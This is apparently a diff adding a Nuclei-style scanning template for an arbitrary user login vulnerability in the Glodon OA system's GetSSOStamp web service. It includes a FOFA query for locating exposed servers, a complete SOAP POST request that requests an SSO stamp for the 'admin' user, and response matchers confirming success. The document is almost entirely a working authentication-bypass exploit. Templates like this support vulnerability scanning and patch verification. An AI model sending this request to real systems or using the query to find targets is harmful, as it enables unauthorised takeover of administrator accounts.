@@ -1,0 +1,37 @@
+id: glodon-oa-getsso-stamp-login
+
+info:
+  name: Glodon OA System GetSSOStamp Arbitrary User Login
+  author: Co5mos
+  severity: critical
+  description: |
+    Glodon OA System's `GetSSOStamp` endpoint has an arbitrary user login vulnerability that allows attackers to login as any user.
+  metadata:
+    verified: true
+    fofa-query: 'header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"'
+  tags: glodon, auth-bypass
+
+http:
+  - raw:
+      - |
+        POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetStamp"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetStamp xmlns="http://tempuri.org/">
+        <usercode>admin</usercode>
+        </GetStamp>
+        </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body, 'GetStampResponse')
+          - "!contains(body, '没有权限访问')"
+        condition: and
